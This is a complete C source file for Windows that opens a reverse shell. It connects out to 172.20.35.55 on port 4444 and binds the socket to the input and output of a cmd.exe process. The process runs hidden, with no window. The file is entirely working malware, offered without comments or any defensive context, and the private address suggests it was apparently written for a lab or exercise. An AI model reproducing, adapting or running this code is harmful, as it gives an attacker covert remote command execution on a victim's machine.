#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")


WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
const char* ip_addr = "172.20.35.55";
const char* port = "4444";


STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main()
{

  
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    struct addrinfo hints, * result;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(ip_addr, port, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    hax.sin_family = AF_INET;
    hax.sin_port = ((struct sockaddr_in*)result->ai_addr)->sin_port;
    hax.sin_addr.s_addr = ((struct sockaddr_in*)result->ai_addr)->sin_addr.s_addr;

    freeaddrinfo(result);

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    ini_processo.wShowWindow = SW_HIDE;

    TCHAR cmd[255] = TEXT("cmd.exe");

    BOOL bSuccess = CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);
    if (!bSuccess) {
        printf("CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    return 0;
}